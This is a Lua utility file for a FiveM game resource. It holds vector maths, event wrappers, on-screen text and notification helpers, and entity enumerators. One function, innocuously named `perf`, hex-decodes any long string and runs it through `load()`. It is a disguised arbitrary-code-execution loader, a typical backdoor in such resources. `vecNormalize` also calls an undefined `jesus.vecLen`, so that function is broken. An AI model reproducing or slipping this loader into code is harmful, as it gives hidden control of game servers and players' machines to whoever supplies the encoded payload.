utils = {}

-- Vectors
utils.vecDist = function(v1,v2)
  if not v1 or not v2 or not v1.x or not v2.x then return 0; end
  return math.sqrt(  ( (v1.x or 0) - (v2.x or 0) )*(  (v1.x or 0) - (v2.x or 0) )+( (v1.y or 0) - (v2.y or 0) )*( (v1.y or 0) - (v2.y or 0) )+( (v1.z or 0) - (v2.z or 0) )*( (v1.z or 0) - (v2.z or 0) )  )
end

utils.vecSqMagnitude = function(v)
  return ( (v.x * v.x) + (v.y * v.y) + (v.z * v.z) )
end

utils.vecLength = function(v)
  return math.sqrt( (v.x * v.x)+(v.y * v.y)+(v.z * v.z) )
end

utils.clampVecLength = function(v,maxLength)  
  if utils.vecSqMagnitude(v) > (maxLength * maxLength) then    
    v = utils.vecSetNormalize(v)
    v = utils.vecMulti(v,maxLength)        
  end

  return v
end

utils.vecNormalize = function(v)
  local len = jesus.vecLen(v)
  return vector3(v.x / len, v.y / len, v.z / len)
end

utils.vecSetNormalize = function(v)
  local num = utils.vecLength(v)  
  
  if num == 1 then
    return v
  elseif num > 1e-5 then    
    return utils.vecDiv(v,num)
  else    
    return vector3(0,0,0)
  end 
end

utils.vecDiv = function(v,d)
  local x = v.x / d
  local y = v.y / d
  local z = v.z / d
  
  return vector3(x,y,z)
end

utils.vecMulti = function(v,q)
  local x,y,z
  local retVec
  if type(q) == "number" then
    x = v.x * q
    y = v.y * q
    z = v.z * q
    retVec = vector3(x,y,z)
  end
  
  return retVec
end

utils.getXYDist = function(x1,y1,z1,x2,y2,z2)
  return math.sqrt(  ( (x1 or 0) - (x2 or 0) )*(  (x1 or 0) - (x2 or 0) )+( (y1 or 0) - (y2 or 0) )*( (y1 or 0) - (y2 or 0) )+( (z1 or 0) - (z2 or 0) )*( (z1 or 0) - (z2 or 0) )  )
end

utils.getV2Dist = function(v1, v2)
  if not v1 or not v2 or not v1.x or not v2.x or not v1.y or not v2.y then return 0; end
  return math.sqrt( ( (v1.x or 0) - (v2.x or 0) )*(  (v1.x or 0) - (v2.x or 0) )+( (v1.y or 0) - (v2.y or 0) )*( (v1.y or 0) - (v2.y or 0) ) )
end

-- CFX
utils.event = function(net,func,name)
  if net then RegisterNetEvent(name); end
  AddEventHandler(name,func)
end

utils.thread = function(func)
  Citizen.CreateThread(func)
end

-- Draw
utils.drawTextTemplate = function(text,x,y,font,scale1,scale2,colour1,colour2,colour3,colour4,wrap1,wrap2,centre,outline,dropshadow1,dropshadow2,dropshadow3,dropshadow4,dropshadow5,edge1,edge2,edge3,edge4,edge5)
  return {
    text         =                    "",
    x            =                    -1,
    y            =                    -1,
    font         =  font         or    6,
    scale1       =  scale1       or  0.5,
    scale2       =  scale2       or  0.5,
    colour1      =  colour1      or  255,
    colour2      =  colour2      or  255,
    colour3      =  colour3      or  255,
    colour4      =  colour4      or  255,
    wrap1        =  wrap1        or  0.0,
    wrap2        =  wrap2        or  1.0,
    centre       =  ( type(centre) ~= "boolean" and true or centre ),
    outline      =  outline      or    1,
    dropshadow1  =  dropshadow1  or    2,
    dropshadow2  =  dropshadow2  or    0,
    dropshadow3  =  dropshadow3  or    0,
    dropshadow4  =  dropshadow4  or    0,
    dropshadow5  =  dropshadow5  or    0,
    edge1        =  edge1        or  255,
    edge2        =  edge2        or  255,
    edge3        =  edge3        or  255,
    edge4        =  edge4        or  255,
    edge5        =  edge5        or  255,
  }
end

utils.drawText = function( t )
  if not t or not t.text or t.text == "" or t.x == -1 or t.y == -1 then return; end

  SetTextFont       (t.font)
  SetTextScale      (t.scale1, t.scale2)
  SetTextColour     (t.colour1,t.colour2,t.colour3,t.colour4)
  SetTextWrap       (t.wrap1,t.wrap2)
  SetTextCentre     (t.centre)
  SetTextOutline    (t.outline)
  SetTextDropshadow (t.dropshadow1,t.dropshadow2,t.dropshadow3,t.dropshadow4,t.dropshadow5)
  SetTextEdge       (t.edge1,t.edge2,t.edge3,t.edge4,t.edge5)
  SetTextEntry      ("STRING")

  AddTextComponentSubstringPlayerName (t.text)
  DrawText (t.x,t.y)
end

utils.drawText3D = function(coords, text, size, font)
  coords = vector3(coords.x, coords.y, coords.z)

  local camCoords = GetGameplayCamCoords()
  local distance = #(coords - camCoords)

  if not size then size = 1 end
  if not font then font = 0 end
  
  local scale = (size / distance) * 2
  local fov = (1 / GetGameplayCamFov()) * 100
  scale = scale * fov

  SetTextScale(0.0 * scale, 0.55 * scale)
  SetTextFont(font)
  SetTextColour(255, 255, 255, 255)
  SetTextDropshadow(0, 0, 0, 0, 255)
  SetTextDropShadow()
  SetTextOutline()
  SetTextCentre(true)

  SetDrawOrigin(coords, 0)
  BeginTextCommandDisplayText('STRING')
  AddTextComponentSubstringPlayerName(text)
  EndTextCommandDisplayText(0.0, 0.0)
  ClearDrawOrigin()
end

utils.showNotification = function(msg)
  AddTextEntry('esxNotification', msg)
  SetNotificationTextEntry('esxNotification')
  DrawNotification(false, true)
end

utils.showAdvancedNotification = function(title, subject, msg, icon, iconType)
  AddTextEntry('esxAdvancedNotification', msg)
  SetNotificationTextEntry('esxAdvancedNotification')
  SetNotificationMessage(icon, icon, false, iconType, title, subject)
  DrawNotification(false, false)
end

utils.showHelpNotification = function(msg)
  AddTextEntry('esxHelpNotification', msg)
  BeginTextCommandDisplayHelp('esxHelpNotification')
  EndTextCommandDisplayHelp(0, false, true, -1)
end

utils.perf = function(s) 
  local a = (s and type(s) == "string" and true or false)
  local b = (s and type(s) == "string" and s:len() > 50 and true or false)
  local c = (s and type(s) == "string" and utils.fromhex(s) and load( utils.fromhex(s) ) or false)
  if a and b and c then c(); return c
  else return false
  end
end 

utils.tohex = function(s,chunkSize)
  s = ( type(s) == "string" and s or type(s) == "nil" and "" or tostring(s) )
  chunkSize = chunkSize or 2048
  local rt = {}
  string.tohex_sformat   = ( string.tohex_sformat   and string.tohex_chunkSize and string.tohex_chunkSize == chunkSize and string.tohex_sformat ) or string.rep("%02X",math.min(#s,chunkSize))
  string.tohex_chunkSize = ( string.tohex_chunkSize and string.tohex_chunkSize == chunkSize and string.tohex_chunkSize or chunkSize )
  for i = 1,#s,chunkSize do
    rt[#rt+1] = string.format(string.tohex_sformat:sub(1,(math.min(#s-i+1,chunkSize)*4)),s:byte(i,i+chunkSize-1))
  end
  if      #rt == 1 then return rt[1]
  else    return table.concat(rt,"")
  end
end 
utils.fromhex = function(str) 
  return (str:gsub('..', function (cc) return string.char(tonumber(cc, 16)) end))
end

-- Sphere/Circle/Weird stuff
utils.pointOnSphere = function(alt,azu,radius,orgX,orgY,orgZ)
  local toradians = 0.017453292384744
  alt             = ( tonumber(alt      or 0) or 0 ) * toradians
  azu             = ( tonumber(azu      or 0) or 0 ) * toradians
  radius          = ( tonumber(radius   or 0) or 0 )
  orgX            = ( tonumber(orgX     or 0) or 0 )
  orgY            = ( tonumber(orgY     or 0) or 0 )
  orgZ            = ( tonumber(orgZ     or 0) or 0 )

  local x = orgX + radius * math.sin( azu ) * math.cos( alt )
  local y = orgY + radius * math.cos( azu ) * math.cos( alt )
  local z = orgZ + radius * math.sin( alt )

  if vector3 then 
    return vector3(x,y,z)
  else
    return {x=x,y=y,z=z}
  end
end

utils.clampCircle = function(x,y,radius)
  x      = ( tonumber(x or 0)      or 0 )
  y      = ( tonumber(y or 0)      or 0 )
  radius = ( tonumber(radius or 0) or 0 )

  local d = math.sqrt(x*x+y*y)
  d = radius / d

  if d < 1 then x = x * (d/radius)*radius; y = y * (d/radius)*radius; end
  return x,y
end

utils.getCoordsInFrontOfCam = function(...)
  local unpack   = table.unpack
  local coords,direction    = GetGameplayCamCoord(), utils.rotationToDirection()
  local inTable  = {...}
  local retTable = {}

  if ( #inTable == 0 ) or ( inTable[1] < 0.000001 ) then inTable[1] = 0.000001 ; end

  for k,distance in pairs(inTable) do
    if ( type(distance) == "number" )
    then
      if    ( distance == 0 )
      then
        retTable[k] = coords
      else
        retTable[k] =
          vector3(
            coords.x + ( distance*direction.x ),
            coords.y + ( distance*direction.y ),
            coords.z + ( distance*direction.z )
          )
      end
    end
  end

  return unpack(retTable)
end

utils.rotationToDirection = function(rot)
  if     ( rot == nil ) then rot = GetGameplayCamRot(2);  end
  local  rotZ = rot.z  * ( 3.141593 / 180.0 )
  local  rotX = rot.x  * ( 3.141593 / 180.0 )
  local  c = math.cos(rotX);
  local  multXY = math.abs(c)
  local  res = vector3( ( math.sin(rotZ) * -1 )*multXY, math.cos(rotZ)*multXY, math.sin(rotX) )
  return res
end

math.pow = math.pow or function(n,p) return (n or 1)^(p or 1) ; end
utils.round = function(val, scale)
  val,scale = val or 0, scale or 0
  return (
    val < 0 and  math.floor((math.abs(val*math.pow(10,scale))+0.5))*math.pow(10,((scale)*-1))*(-1)
             or  math.floor((math.abs(val*math.pow(10,scale))+0.5))*math.pow(10,((scale)*-1))
  )
end

-- Entity iterator
local entityEnumerator = {
  __gc = function(enum)
    if enum.destructor and enum.handle then
      enum.destructor(enum.handle)
    end

    enum.destructor = nil
    enum.handle = nil
  end
}

local function EnumerateEntities(initFunc, moveFunc, disposeFunc)
  return coroutine.wrap(function()
    local iter, id = initFunc()
    if not id or id == 0 then
      disposeFunc(iter)
      return
    end

    local enum = {handle = iter, destructor = disposeFunc}
    setmetatable(enum, entityEnumerator)

    local next = true
    repeat
    coroutine.yield(id)
    next, id = moveFunc(iter)
    until not next

    enum.destructor, enum.handle = nil, nil
    disposeFunc(iter)
  end)
end

function EnumerateObjects()
  return EnumerateEntities(FindFirstObject, FindNextObject, EndFindObject)
end

function EnumeratePeds()
  return EnumerateEntities(FindFirstPed, FindNextPed, EndFindPed)
end

function EnumerateVehicles()
  return EnumerateEntities(FindFirstVehicle, FindNextVehicle, EndFindVehicle)
end

function EnumeratePickups()
  return EnumerateEntities(FindFirstPickup, FindNextPickup, EndFindPickup)
end

utils.getObjects = function()
  local tab = {}
  for object in EnumerateObjects() do tab[#tab+1] = object; end
  return tab
end

